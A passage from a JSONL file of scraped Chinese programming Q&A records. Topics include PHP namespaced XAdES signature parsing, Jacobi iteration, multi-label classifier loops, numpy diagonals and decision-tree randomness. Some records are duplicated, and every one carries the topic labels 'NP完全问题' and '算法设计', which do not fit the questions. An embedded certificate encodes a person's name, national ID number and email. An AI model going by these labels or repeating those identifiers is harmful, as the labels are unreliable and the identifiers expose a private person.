Id=\"ID-e37958b8-134c-4f51-9b25-8274fd1edce7\" MimeType=\"text/plain\">PFRyZXNjUGlzbWE+DQogIDxTeWduYXR1cmFBa3Q+QUJDWFlaMTIzPC9TeWduYXR1cmFBa3Q+DQogIDxQ\nb2RtaW90eT4NCiAgICA8UG9kbWlvdD4NCiAgICAgIDxPc29iYUZpenljem5hPg0KICAgICAgICA8SW1p\nZT5KYW51c3o8L0ltaWU+DQogICAgICAgIDxOYXp3aXNrbz5Ob3dhazwvTmF6d2lza28+DQogICAgICAg\nIDxPem5hY3plbmllPg0KICAgICAgICAgIDxQZXNlbD44OTEwMDEwMDYxNjwvUGVzZWw+DQogICAgICAg\nIDwvT3puYWN6ZW5pZT4NCiAgICAgIDwvT3NvYmFGaXp5Y3puYT4NCiAgICA8L1BvZG1pb3Q+DQogIDwv\nUG9kbWlvdHk+DQogIDxQb2RzdGF3YVByYXduYT4NCiAgICA8UG9kc3Rhd2E+UFBfMDA0PC9Qb2RzdGF3\nYT4NCiAgPC9Qb2RzdGF3YVByYXduYT4NCjwvVHJlc2NQaXNtYT4=</ds:Object>\n   </ds:Signature>\n</Signatures>\n", "\n\n", "When I load it with simplexml_load_string, var_dump shows:", "\n\n", "object(SimpleXMLElement)#212 (1) {\n  [\"@attributes\"] => array(1) {\n    [\"Id\"] => string(39) \"ID-222cf3cf-0f0b-49d2-b7cb-4cf47bb373cb\"\n  }\n}\n", "\n\n", "There's no nested nodes of \"Signatures\" data.", "\n\n", "However, when I remove \"ds\" namespaces from tags, it works great.", "\n\n", "How can I get them without changing document?", "\n    "]], "Tag": "算法设计"}
{"Answer": "```\r\n# -*- coding: utf-8 -*-\r\n \r\n#Jacobi迭代法 输入系数矩阵mx、值矩阵mr、迭代次数n、误差c(以list模拟矩阵 行优先)\r\n \r\ndef Jacobi(mx,mr,n=100,c=0.0001):\r\n    if len(mx) == len(mr):  #若mx和mr长度相等则开始迭代 否则方程无解\r\n        x = [] #迭代初值 初始化为单行全0矩阵\r\n        for i in range(len(mr)):\r\n            x.append([0])\r\n        count = 0 #迭代次数计数\r\n        while count &lt; n:\r\n            nx = [] #保存单次迭代后的值的集合\r\n            for i in range(len(x)):\r\n                nxi = mr[i][0]\r\n                for j in range(len(mx[i])):\r\n                    if j!=i:\r\n                        nxi = nxi+(-mx[i][j])*x[j][0]\r\n                nxi = nxi/mx[i][i]\r\n                nx.append([nxi]) #迭代计算得到的下一个xi值\r\n            lc = [] #存储两次迭代结果之间的误差的集合\r\n            for i in range(len(x)):\r\n                lc.append(abs(x[i][0]-nx[i][0]))\r\n            if max(lc) &lt; c:\r\n                return nx #当误差满足要求时 返回计算结果\r\n            x = nx\r\n            count = count + 1\r\n        return False #若达到设定的迭代结果仍不满足精度要求 则方程无解\r\n    else:\r\n        return False\r\n \r\n#调用 Jacobi(mx,mr,n=100,c=0.001) 示例\r\nmx = [[8,-3,2],[4,11,-1],[6,3,12]]\r\n \r\nmr = [[20],[33],[36]]\r\nprint(Jacobi(mx,mr,100,0.00001))\r\n\r\n```\r\nhttps://blog.csdn.net/cswfqxs_/article/details/84067711", "Konwledge_Point": "NP完全问题", "Question": ["python 用雅可比方法求解稀疏矩阵，完全不会写，求助a", ["\n\n", "import numpy as np", "\ndef Jacobi(A, b, iter_n, initial_guess=0):", "\n    n = len(A)", "\n\n", "D = np.diag(A)\nR = A - np.diag(D)\nx_i = initial_guess * np.ones(n)\nfor i in range(iter_n):\n    print('x_',i,'=',x_i)\n    x_i = (b - R.dot(x_i)) / D\n\nreturn x_i\n", "\n\n", "def A_ij(n):", "\n   A = np.empty((n, n))", "\n    for i in range(n):", "\n        A[i, i] = 2", "\n    for i in range(n-1):", "\n        A[i,i+1]=A[i+1,i]=1", "\n    return A", "\ndef b_i(n):", "\n    b=np.empty(n)", "\n    b[0]=1", "\n    b[n-1]=-1", "\n    return b", "\ndef x0(n):", "\n    return np.zeros(n)", "\nprint(Jacobi(A,b,100,x0))"]], "Tag": "算法设计"}
{"Answer": "&lt;div class=\"post-text\" itemprop=\"text\"&gt;\r\n&lt;p&gt;Thanks to the &lt;a href=\"https://stackoverflow.com/questions/35435626/simplexml-load-string-doesnt-fully-load-xades-bes-signature-xml?noredirect=1#comment58599247_35435626\"&gt;michi's comment&lt;/a&gt;, I found a solution. Namespaced nodes should be accessed differently than nodes without namespace.&lt;/p&gt;\n\n&lt;p&gt;So, basing on the example above, when I want to use Signature node, I can do it like this:&lt;/p&gt;\n\n&lt;pre&gt;&lt;code&gt;$xml = simplexml_load_string($content);\n$signatureNode = $xml-&amp;gt;children('ds', true)-&amp;gt;Signature;\n&lt;/code&gt;&lt;/pre&gt;\n    &lt;/div&gt;", "Konwledge_Point": "NP完全问题", "Question": ["sImplexml_load_string未完全加载XAdES-BES签名XML", ["\n\n", "I've got XML containing XAdES-BES digita signature:", "\n\n", "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<Signatures Id=\"ID-222cf3cf-0f0b-49d2-b7cb-4cf47bb373cb\">\n   <ds:Signature xmlns:ds=\"http://www.w3.org/2000/09/xmldsig#\" Id=\"ID-9a61610b-c8e3-4201-bf41-a174cbc21634\">\n      <ds:SignedInfo Id=\"ID-8ebe3e85-1413-4fec-a14c-7264546ab770\">\n         <ds:CanonicalizationMethod Algorithm=\"http://www.w3.org/TR/2001/REC-xml-c14n-20010315\" />\n         <ds:SignatureMethod Algorithm=\"http://www.w3.org/2000/09/xmldsig#rsa-sha1\" />\n         <ds:Reference Id=\"ID-e751928b-6823-47ad-a5ae-b7ccdf301751\" URI=\"#ID-e37958b8-134c-4f51-9b25-8274fd1edce7\">\n            <ds:DigestMethod Algorithm=\"http://www.w3.org/2000/09/xmldsig#sha1\" />\n            <ds:DigestValue>Z7q3zqS5FTNPP/mj0rDmUV5PdZQ=</ds:DigestValue>\n         </ds:Reference>\n         <ds:Reference Id=\"ID-396858b0-7e4b-42e1-ba5f-18368f90f0df\" URI=\"#ID-90b9721b-1d1c-4104-ae2c-ebb6b251cf2b\" Type=\"http://uri.etsi.org/01903#SignedProperties\">\n            <ds:DigestMethod Algorithm=\"http://www.w3.org/2000/09/xmldsig#sha1\" />\n            <ds:DigestValue>H7EeV4pPoJ6WhWFnVSo3WNu3Yj8=</ds:DigestValue>\n         </ds:Reference>\n      </ds:SignedInfo>\n      <ds:SignatureValue Id=\"ID-949000f9-85bc-435e-b387-8f7aa5551d75\">a0cc/hQYjmwQC8ssBzolLyArUqOVi+s6cP+lbxku69qGleBUroQlvD6o+GpIxSJB6wlWwic3YjuxDxn9\nmfW2jCLYEEM1RB277ChnHASakC+vbBP03LWC+GxsOe0seKMVsCc0EPwS5kk5RfvrUN6sTxWSW/2MOIXG\n4fW1cAtjh1SjDN9Ij38SIuWpW8guJ9EGEVyTUuTiZ5dbpHfxftgKfHmr16aMpXk0ta46X2UuGTQRB+E/\n0W+RpLqdmTP5VG0CxT8Z2H4n6puGL0yC20SsZZDethL/Vnr67EXTPmHFUwoZOGNu+0IFdBJW4HvLA5rF\nczL82MOsCoFXqzMVxGxiqw==</ds:SignatureValue>\n      <ds:KeyInfo>\n         <ds:KeyValue>\n            <ds:RSAKeyValue>\n               <ds:Modulus>AL4k+zz02RytjonBY0af0dfuuDJhNg0dypClqzkLyyLjkTa9QUbtdtA20lRuogjFqb6CVpqQ/PEdXDK5\nbN6qGBQGsmdqkgru6A8aAc57QawEcbEL+rDue1L+mqM/JVnr+DAWOehITd8HzS0JQTQcxF1Lv0L1GNbJ\nP8/bo8Coj2EVtKZ9tBI9+AZUdZ11uKBYj9uvKy0VGufjoljIIrQASIft4nw8a/WF+beEYOrl3PqnBcAo\nLc/CJiNsnsASws0a/EKuaP3vQbIo36s7FVH7U4x/8ypcAPsmtgi9LbH+v9Ugc2CiCj7krJIT3X9EwkjC\nFUq+MykmVvfW0D0bOTP2X5k=</ds:Modulus>\n               <ds:Exponent>AQAB</ds:Exponent>\n            </ds:RSAKeyValue>\n         </ds:KeyValue>\n         <ds:X509Data>\n            <ds:X509Certificate>MIIGETCCBPmgAwIBAgIUaQ+g3SS0YfvHQus43mbJ+4FSYegwDQYJKoZIhvcNAQEFBQAwczELMAkGA1UE\nBhMCUEwxKDAmBgNVBAoMH0tyYWpvd2EgSXpiYSBSb3psaWN6ZW5pb3dhIFMuQS4xJDAiBgNVBAMMG0NP\nUEUgU1pBRklSIC0gS3dhbGlmaWtvd2FueTEUMBIGA1UEBRMLTnIgd3Bpc3U6IDYwHhcNMTUxMDA4MTIw\nMDAwWhcNMTYxMDA4MTIwMDAwWjB2MQswCQYDVQQGEwJQTDEbMBkGA1UEBRMSUEVTRUw6IDg2MDYxMzE0\nMzk3MR8wHQYDVQQDDBZLYW1pbCBTZWJhc3RpYW4gTWlqYWN6MRgwFgYDVQQqDA9LYW1pbCBTZWJhc3Rp\nYW4xDzANBgNVBAQMBk1pamFjejCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAL4k+zz02Ryt\njonBY0af0dfuuDJhNg0dypClqzkLyyLjkTa9QUbtdtA20lRuogjFqb6CVpqQ/PEdXDK5bN6qGBQGsmdq\nkgru6A8aAc57QawEcbEL+rDue1L+mqM/JVnr+DAWOehITd8HzS0JQTQcxF1Lv0L1GNbJP8/bo8Coj2EV\ntKZ9tBI9+AZUdZ11uKBYj9uvKy0VGufjoljIIrQASIft4nw8a/WF+beEYOrl3PqnBcAoLc/CJiNsnsAS\nws0a/EKuaP3vQbIo36s7FVH7U4x/8ypcAPsmtgi9LbH+v9Ugc2CiCj7krJIT3X9EwkjCFUq+MykmVvfW\n0D0bOTP2X5kCAwEAAaOCApgwggKUMAwGA1UdEwEB/wQCMAAwggFPBgNVHSABAf8EggFDMIIBPzCCATsG\nCSqEaAGG9yMBATCCASwwgd0GCCsGAQUFBwICMIHQDIHNRGVrbGFyYWNqYSB0YSBqZXN0IG/Fm3dpYWRj\nemVuaWVtIHd5ZGF3Y3ksIMW8ZSB0ZW4gY2VydHlmaWthdCB6b3N0YcWCIHd5ZGFueSBqYWtvIGNlcnR5\nZmlrYXQga3dhbGlmaWtvd2FueSB6Z29kbmllIHogd3ltYWdhbmlhbWkgdXN0YXd5IG8gcG9kcGlzaWUg\nZWxla3Ryb25pY3pueW0gb3JheiB0b3dhcnp5c3rEhWN5bWkgamVqIHJvenBvcnrEhWR6ZW5pYW1pLjBK\nBggrBgEFBQcCARY+aHR0cDovL3d3dy5lbGVrdHJvbmljem55cG9kcGlzLnBsL2luZm9ybWFjamUvZG9r\ndW1lbnR5LWktdW1vd3kwCQYDVR0JBAIwADAhBgNVHREEGjAYgRZrYW1pbC5taWphY3pAZ21haWwuY29t\nMA4GA1UdDwEB/wQEAwIGQDCBsAYDVR0jBIGoMIGlgBTMQSp2mC5KehnakTbf2H85P9TCrqF3pHUwczEL\nMAkGA1UEBhMCUEwxKDAmBgNVBAoMH0tyYWpvd2EgSXpiYSBSb3psaWN6ZW5pb3dhIFMuQS4xJDAiBgNV\nBAMMG0NPUEUgU1pBRklSIC0gS3dhbGlmaWtvd2FueTEUMBIGA1UEBRMLTnIgd3Bpc3U6IDaCFH18c1x7\nvNOu01acH+WfGYiAcun0MEAGA1UdHwQ5MDcwNaAzoDGGL2h0dHA6Ly9lbGVrdHJvbmljem55cG9kcGlz\nLnBsL2NybC9jcmxfb3prNTIuY3JsMA0GCSqGSIb3DQEBBQUAA4IBAQAP0zddWprl5hpXiIiMGcC5D7ob\n/nj3wvfOUm0QCf7+ZEorfr6EC96B6F/cNtZ1wXtAQXkf5Zm3gPhbKXY6XWM2NDWadZrDV9zV75Ab06dQ\n5qmDfuMGTfPUdH3+QBmW7YnniWPCGuMzGNlP9DpZ45YrgRnwlsZSHMhX0HiEeDfYKAkGhIaJ7lcPlZrj\nzWBdhUOgYm06pYf8NEKVWzu808iIHIvCBot0ADcZ8ypxDyQsco/RSRGY0EO8FATCH3j2Oe/+7FGRjRQK\nXczBsKu6G8GQ6b/eGuWD7NNAuBX4UJu9jXRo9mzo7zKj01/SPfE4kHTHfHr9yi9BBkzAmaAxQpT5</ds:X509Certificate>\n         </ds:X509Data>\n      </ds:KeyInfo>\n      <ds:Object>\n         <xades:QualifyingProperties xmlns:xades=\"http://uri.etsi.org/01903/v1.3.2#\" Id=\"ID-04b0ddeb-914c-419f-acb2-780dae2ee890\" Target=\"#ID-9a61610b-c8e3-4201-bf41-a174cbc21634\">\n            <xades:SignedProperties Id=\"ID-90b9721b-1d1c-4104-ae2c-ebb6b251cf2b\">\n               <xades:SignedSignatureProperties>\n                  <xades:SigningTime>2015-12-08T13:37:16Z</xades:SigningTime>\n                  <xades:SigningCertificate>\n                     <xades:Cert>\n                        <xades:CertDigest>\n                           <ds:DigestMethod Algorithm=\"http://www.w3.org/2000/09/xmldsig#sha1\" />\n                           <ds:DigestValue>+6UE5SSks6Cn6++o8CAkSO/NMWk=</ds:DigestValue>\n                        </xades:CertDigest>\n                        <xades:IssuerSerial>\n                           <ds:X509IssuerName>serialNumber=Nr wpisu: 6,CN=COPE SZAFIR - Kwalifikowany,O=Krajowa Izba Rozliczeniowa S.A.,C=PL</ds:X509IssuerName>\n                           <ds:X509SerialNumber>599792555331422089182929030726347827824527827432</ds:X509SerialNumber>\n                        </xades:IssuerSerial>\n                     </xades:Cert>\n                  </xades:SigningCertificate>\n               </xades:SignedSignatureProperties>\n               <xades:SignedDataObjectProperties>\n                  <xades:DataObjectFormat ObjectReference=\"#ID-e751928b-6823-47ad-a5ae-b7ccdf301751\">\n                     <xades:Description>Dokument w formacie xml [XML]</xades:Description>\n                     <xades:MimeType>text/plain</xades:MimeType>\n                     <xades:Encoding>http://www.w3.org/2000/09/xmldsig#base64</xades:Encoding>\n                  </xades:DataObjectFormat>\n               </xades:SignedDataObjectProperties>\n            </xades:SignedProperties>\n         </xades:QualifyingProperties>\n      </ds:Object>\n      <ds:Object Encoding=\"http://www.w3.org/2000/09/xmldsig#base64\" Id=\"ID-e37958b8-134c-4f51-9b25-8274fd1edce7\" MimeType=\"text/plain\">PFRyZXNjUGlzbWE+DQogIDxTeWduYXR1cmFBa3Q+QUJDWFlaMTIzPC9TeWduYXR1cmFBa3Q+DQogIDxQ\nb2RtaW90eT4NCiAgICA8UG9kbWlvdD4NCiAgICAgIDxPc29iYUZpenljem5hPg0KICAgICAgICA8SW1p\nZT5KYW51c3o8L0ltaWU+DQogICAgICAgIDxOYXp3aXNrbz5Ob3dhazwvTmF6d2lza28+DQogICAgICAg\nIDxPem5hY3plbmllPg0KICAgICAgICAgIDxQZXNlbD44OTEwMDEwMDYxNjwvUGVzZWw+DQogICAgICAg\nIDwvT3puYWN6ZW5pZT4NCiAgICAgIDwvT3NvYmFGaXp5Y3puYT4NCiAgICA8L1BvZG1pb3Q+DQogIDwv\nUG9kbWlvdHk+DQogIDxQb2RzdGF3YVByYXduYT4NCiAgICA8UG9kc3Rhd2E+UFBfMDA0PC9Qb2RzdGF3\nYT4NCiAgPC9Qb2RzdGF3YVByYXduYT4NCjwvVHJlc2NQaXNtYT4=</ds:Object>\n   </ds:Signature>\n</Signatures>\n", "\n\n", "When I load it with simplexml_load_string, var_dump shows:", "\n\n", "object(SimpleXMLElement)#212 (1) {\n  [\"@attributes\"] => array(1) {\n    [\"Id\"] => string(39) \"ID-222cf3cf-0f0b-49d2-b7cb-4cf47bb373cb\"\n  }\n}\n", "\n\n", "There's no nested nodes of \"Signatures\" data.", "\n\n", "However, when I remove \"ds\" namespaces from tags, it works great.", "\n\n", "How can I get them without changing document?", "\n    "]], "Tag": "算法设计"}
{"Answer": "&lt;p&gt;我先确认个问题哈&amp;#xff0c;train的行现在的物理含义是什么&amp;#xff1f;一般来说&amp;#xff0c;行代表样本&amp;#xff0c;列表示特征。但如果是这样的话就是不对的&amp;#xff0c;对样本的顺序进行打乱以后并不会改变分类器的效果&amp;#xff0c;这个是需要对列的顺序进行打乱。比如昨天帖子里的from skmultilearn.problem_transform import ClassifierChain&amp;#xff0c;本质上是先根据x预测y1&amp;#xff0c;然后再根据x、y1预测y2&amp;#xff0c;以此类推&amp;#xff0c;所以需要对y的顺序进行重排。所以您先确认一下行与列的物理含义对不对&amp;#xff0c;如果是对的话&amp;#xff0c;我再看看别的问题。&lt;/p&gt;\n&lt;pre&gt;&lt;code class=\"language-python\"&gt;&lt;span class=\"hljs-attr\"&gt;row_rand&lt;/span&gt; &amp;#61; np.random.permutation(train)  &lt;span class=\"hljs-comment\"&gt;# 打乱数据顺序&amp;#xff08;使链排序为随机&amp;#xff09;&lt;/span&gt;\n&lt;span class=\"hljs-attr\"&gt;row_rand_data&lt;/span&gt; &amp;#61; row_rand[..., &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;:&lt;span class=\"hljs-number\"&gt;74&lt;/span&gt;]\n&lt;span class=\"hljs-attr\"&gt;row_rand_label&lt;/span&gt; &amp;#61; row_rand[..., &lt;span class=\"hljs-number\"&gt;74&lt;/span&gt;:&lt;span class=\"hljs-number\"&gt;134&lt;/span&gt;]\n&lt;/code&gt;&lt;/pre&gt;", "Konwledge_Point": "NP完全问题", "Question": ["多标签分类模型循环问题", ["问题遇到的现象和发生背景", "\n", "循环训练模型。我在循环训练模型的时候，随机打乱了训练数据，最后得到的结果都是一样的。我尝试单独运行5和10迭代次数，结果不一样。按理来说循环结果应该是不一样的，但是出现了结果完全相同的结果。", "\n", "问题相关代码，请勿粘贴截图", "\n", "\n", "\n", "# 随机选取训练集，并训练模型，并得到各个模型预测结果", "\ndef train_m(m):\n    ", "\"\"", "\"\n    :param m: 设置模型数目\n    :return: 返回m个模型\n    \"", "\"\"", "\n    ", "model", " = {}  ", "# 设置空的字典，用以存储模型或预测结果", "\n    ", "pred", " = {}\n    ", "i", " = ", "0", "\n    while i < m:\n        ", "row_rand", " = np.random.permutation(train)  ", "# 打乱数据顺序（使链排序为随机）", "\n        ", "row_rand_data", " = row_rand[..., ", "0", ":", "74", "]\n        ", "row_rand_label", " = row_rand[..., ", "74", ":", "134", "]\n\n        ", "# 训练模型，将所有模型存储在字典中", "\n        ", "clf", " = ClassifierChain(LGBMClassifier())\n        ", "clf_i", " = clf.fit(row_rand_data, row_rand_label)\n        ", "clf_i_copy", " = copy.copy(clf_i)\n        model['%s'%i] = clf_i_copy\n\n        ", "# 预测，将所有预测结果存储在字典中，并将结果转换为数组toarray()", "\n        ", "pred_i", " = clf_i.predict(test_data).toarray()\n        ", "pred_i_copy", " = copy.copy(pred_i)\n        pred['%s'%i] = pred_i_copy\n\n        ", "i", " = i + ", "1", "\n\n    return model, pred\n\n", "# 计算权重，得到最终预测结果", "\ndef w_pred_get(prediction_all, ft):\n    ", "w", " = prediction_all['", "0", "']\n    ", "num", " = ", "0", "\n    ", "i", " = ", "j", " = ", "0", "\n    ", "# 统计预测标签数目", "\n    while i < np.shape(prediction_all['", "0", "'])[", "0", "]:\n        while j < np.shape(prediction_all['", "0", "'])[", "1", "]:\n            for value ", "in", " prediction_all.values():\n                ", "if", " value[i, j] == ", "1", ":\n                    ", "num", " = num + ", "1", "\n            w[i, j] = num\n            ", "num", " = ", "0", "\n            ", "j", " = j + ", "1", "\n        ", "j", " = ", "0", "\n        ", "i", " = i + ", "1", "\n    ", "w", " = w/len(prediction_all) ", "# 得到权值", "\n\n    ", "# 设置阈值ft，得到最终预测结果", "\n    ", "condition", " = w < ft\n    ", "condition2", " = w >= ft\n    ", "prediction", " = np.where(condition, w, ", "1", ")\n    ", "prediction", " = np.where(condition2, prediction, ", "0", ")\n\n    return prediction, w\n\n\n", "# 查看不同迭代次数对于acc的影响，并进行可视化", "\nfor t ", "in", " np.arange(", "5", ", ", "20", ", ", "5", "):\n    model_it, ", "pred_it", " = train_m(t)\n    pred_w, ", "w", " = w_pred_get(pred_it, ", "0.5", ")\n    ", "Subset_Accuracy", " = accuracy_score(pred_w, test_label)\n    print(t, Subset_Accuracy)\n    ", "t", " = t + ", "5", "\n\n\n"]], "Tag": "算法设计"}
{"Answer": "&lt;p&gt;我先确认个问题哈&amp;#xff0c;train的行现在的物理含义是什么&amp;#xff1f;一般来说&amp;#xff0c;行代表样本&amp;#xff0c;列表示特征。但如果是这样的话就是不对的&amp;#xff0c;对样本的顺序进行打乱以后并不会改变分类器的效果&amp;#xff0c;这个是需要对列的顺序进行打乱。比如昨天帖子里的from skmultilearn.problem_transform import ClassifierChain&amp;#xff0c;本质上是先根据x预测y1&amp;#xff0c;然后再根据x、y1预测y2&amp;#xff0c;以此类推&amp;#xff0c;所以需要对y的顺序进行重排。所以您先确认一下行与列的物理含义对不对&amp;#xff0c;如果是对的话&amp;#xff0c;我再看看别的问题。&lt;/p&gt;\n&lt;pre&gt;&lt;code class=\"language-python\"&gt;&lt;span class=\"hljs-attr\"&gt;row_rand&lt;/span&gt; &amp;#61; np.random.permutation(train)  &lt;span class=\"hljs-comment\"&gt;# 打乱数据顺序&amp;#xff08;使链排序为随机&amp;#xff09;&lt;/span&gt;\n&lt;span class=\"hljs-attr\"&gt;row_rand_data&lt;/span&gt; &amp;#61; row_rand[..., &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;:&lt;span class=\"hljs-number\"&gt;74&lt;/span&gt;]\n&lt;span class=\"hljs-attr\"&gt;row_rand_label&lt;/span&gt; &amp;#61; row_rand[..., &lt;span class=\"hljs-number\"&gt;74&lt;/span&gt;:&lt;span class=\"hljs-number\"&gt;134&lt;/span&gt;]\n&lt;/code&gt;&lt;/pre&gt;", "Konwledge_Point": "NP完全问题", "Question": ["多标签分类模型循环问题", ["问题遇到的现象和发生背景", "\n", "循环训练模型。我在循环训练模型的时候，随机打乱了训练数据，最后得到的结果都是一样的。我尝试单独运行5和10迭代次数，结果不一样。按理来说循环结果应该是不一样的，但是出现了结果完全相同的结果。", "\n", "问题相关代码，请勿粘贴截图", "\n", "\n", "\n", "# 随机选取训练集，并训练模型，并得到各个模型预测结果", "\ndef train_m(m):\n    ", "\"\"", "\"\n    :param m: 设置模型数目\n    :return: 返回m个模型\n    \"", "\"\"", "\n    ", "model", " = {}  ", "# 设置空的字典，用以存储模型或预测结果", "\n    ", "pred", " = {}\n    ", "i", " = ", "0", "\n    while i < m:\n        ", "row_rand", " = np.random.permutation(train)  ", "# 打乱数据顺序（使链排序为随机）", "\n        ", "row_rand_data", " = row_rand[..., ", "0", ":", "74", "]\n        ", "row_rand_label", " = row_rand[..., ", "74", ":", "134", "]\n\n        ", "# 训练模型，将所有模型存储在字典中", "\n        ", "clf", " = ClassifierChain(LGBMClassifier())\n        ", "clf_i", " = clf.fit(row_rand_data, row_rand_label)\n        ", "clf_i_copy", " = copy.copy(clf_i)\n        model['%s'%i] = clf_i_copy\n\n        ", "# 预测，将所有预测结果存储在字典中，并将结果转换为数组toarray()", "\n        ", "pred_i", " = clf_i.predict(test_data).toarray()\n        ", "pred_i_copy", " = copy.copy(pred_i)\n        pred['%s'%i] = pred_i_copy\n\n        ", "i", " = i + ", "1", "\n\n    return model, pred\n\n", "# 计算权重，得到最终预测结果", "\ndef w_pred_get(prediction_all, ft):\n    ", "w", " = prediction_all['", "0", "']\n    ", "num", " = ", "0", "\n    ", "i", " = ", "j", " = ", "0", "\n    ", "# 统计预测标签数目", "\n    while i < np.shape(prediction_all['", "0", "'])[", "0", "]:\n        while j < np.shape(prediction_all['", "0", "'])[", "1", "]:\n            for value ", "in", " prediction_all.values():\n                ", "if", " value[i, j] == ", "1", ":\n                    ", "num", " = num + ", "1", "\n            w[i, j] = num\n            ", "num", " = ", "0", "\n            ", "j", " = j + ", "1", "\n        ", "j", " = ", "0", "\n        ", "i", " = i + ", "1", "\n    ", "w", " = w/len(prediction_all) ", "# 得到权值", "\n\n    ", "# 设置阈值ft，得到最终预测结果", "\n    ", "condition", " = w < ft\n    ", "condition2", " = w >= ft\n    ", "prediction", " = np.where(condition, w, ", "1", ")\n    ", "prediction", " = np.where(condition2, prediction, ", "0", ")\n\n    return prediction, w\n\n\n", "# 查看不同迭代次数对于acc的影响，并进行可视化", "\nfor t ", "in", " np.arange(", "5", ", ", "20", ", ", "5", "):\n    model_it, ", "pred_it", " = train_m(t)\n    pred_w, ", "w", " = w_pred_get(pred_it, ", "0.5", ")\n    ", "Subset_Accuracy", " = accuracy_score(pred_w, test_label)\n    print(t, Subset_Accuracy)\n    ", "t", " = t + ", "5", "\n\n\n"]], "Tag": "算法设计"}
{"Answer": "&lt;p&gt;你好&amp;#xff0c;请使用&lt;/p&gt;\n&lt;pre&gt;&lt;code class=\"language-javascript\"&gt;&lt;span class=\"hljs-attribute\"&gt;b&lt;/span&gt; &lt;span class=\"hljs-operator\"&gt;&amp;#61;&lt;/span&gt; np.diag(a)\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;b即是你需要的&lt;/p&gt;", "Konwledge_Point": "NP完全问题", "Question": ["对于一个4*4的数组，如何提取对角线的数据并组成一维数组？", ["问题：有一个4行4列的数组（比如：np.random.randint(0,10,size=(4,4))），请将其中对角线的数取出来形成一个一维数组。提示（使用np.eye）。", "思路：我只会一个一个数据定位，可以用for循环，然后创建一个空列表，再一个个用append() 添加进去。", "如何用np.eye()解答，完全没有思路。请求有经验的tutor指导。谢谢！", "\n", "P.S. 麻烦最好能留下代码，方便阅读"]], "Tag": "算法设计"}
{"Answer": "&lt;p&gt;你好&amp;#xff0c;请使用&lt;/p&gt;\n&lt;pre&gt;&lt;code class=\"language-javascript\"&gt;&lt;span class=\"hljs-attribute\"&gt;b&lt;/span&gt; &lt;span class=\"hljs-operator\"&gt;&amp;#61;&lt;/span&gt; np.diag(a)\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;b即是你需要的&lt;/p&gt;", "Konwledge_Point": "NP完全问题", "Question": ["对于一个4*4的数组，如何提取对角线的数据并组成一维数组？", ["问题：有一个4行4列的数组（比如：np.random.randint(0,10,size=(4,4))），请将其中对角线的数取出来形成一个一维数组。提示（使用np.eye）。", "思路：我只会一个一个数据定位，可以用for循环，然后创建一个空列表，再一个个用append() 添加进去。", "如何用np.eye()解答，完全没有思路。请求有经验的tutor指导。谢谢！", "\n", "P.S. 麻烦最好能留下代码，方便阅读"]], "Tag": "算法设计"}
{"Answer": "&lt;p&gt;sklearn.tree.DecisionTreeClassifier()在进行分支的时候特征选择是随机的&amp;#xff0c;即使是splitter&amp;#61;”best”的时候。打印dt_clf.feature_importances_的话就会看到有两种不同的结果&amp;#xff0c;对应两种决策边界。sklearn.tree.DecisionTreeClassifier的函数说明中明确说&amp;#xff1a;&lt;/p&gt;\n&lt;blockquote&gt;\n&lt;p&gt;&lt;strong&gt;random_state&amp;#xff1a;int, RandomState instance or None, default&amp;#61;None&lt;/strong&gt;&lt;br /&gt;Controls the randomness of the estimator. &lt;strong&gt;The features are always randomly permuted at each split, even if splitter is set to &amp;#34;best&amp;#34;.&lt;/strong&gt; When max_features &amp;lt; n_features, the algorithm will select max_features at random at each split before finding the best split among them. But the best found split may vary across different runs, even if max_features&amp;#61;n_features. That is the case, if the improvement of the criterion is identical for several splits and one split has to be selected at random. To obtain a deterministic behaviour during fitting, random_state has to be fixed to an integer. See Glossary for details.&lt;/p&gt;\n&lt;/blockquote&gt;", "Konwledge_Point": "NP完全问题", "Question": ["机器学习决策树鸢尾花数据集，绘制决策边界，出现相同代码相同数据多次运行，结果不一致的问题", ["练习机器学习中，采用决策树将鸢尾花的数据进行分类，并绘制决策边界，代码如下：", "\n", "import", " numpy as np\n", "import", " matplotlib.pyplot as plt\nfrom sklearn ", "import", " datasets\n", "iris", " = datasets.load_iris()\n", "x", " = iris.data[:,", "2", ":]\n", "y", " = iris.target\nfrom sklearn.tree ", "import", " DecisionTreeClassifier\n", "dt_clf", " = DecisionTreeClassifier(", "max_depth", " = ", "2", ",", "criterion", " = 'entropy')\ndt_clf.fit(x,y)\n\ndef plot_decision_boundary(model,axis):\n    x0,", "x1", " = np.meshgrid(\n        np.linspace(axis[", "0", "],axis[", "1", "],int((axis[", "1", "]-axis[", "0", "])*", "200", ")),\n        np.linspace(axis[", "2", "],axis[", "3", "],int((axis[", "3", "]-axis[", "2", "])*", "200", "))\n    )\n    \n    ", "x_new", " = np.c_[x0.ravel(),x1.ravel()]\n    ", "y_predict", " = model.predict(x_new)\n    ", "zz", " = y_predict.reshape(x0.shape)\n    \n    from matplotlib.colors ", "import", " ListedColormap\n    ", "custom_cmap", " = ListedColormap(['", "#EF9A9A','#FFF59D','#90CAF9'])", "\n    plt.contourf(x0,x1,zz,", "cmap", " = custom_cmap)\n\nplot_decision_boundary(dt_clf,", "axis=", " [", "0.5", ",", "7.5", ",", "0", ",", "3", "])\nplt.scatter(x[", "y==0,0],x[y==0,1])", "\nplt.scatter(x[", "y==1,0],x[y==1,1])", "\nplt.scatter(x[", "y==2,0],x[y==2,1])", "\nplt.show() ", "# 这个结果有点不对 ，但我又不知道哪里搞错了", "\n", "\n", "第一次运行出现了下图所示的分类结果：", "\n", "第二次及以后运行时出现了下图的分类结果：", "\n", "我想知道明明是相同的数据，相同的代码，只是运行先后顺序不同，为什么会出现上下两个图之间的完全不同的分类结果，并且出现哪种分类结果还有一定的随机性？我的代码里也没有随机数。虽然非参数学习对于数据依赖非常严重，但是我的数据也没有发生更改啊，很奇怪。"]], "Tag": "算法设计"}
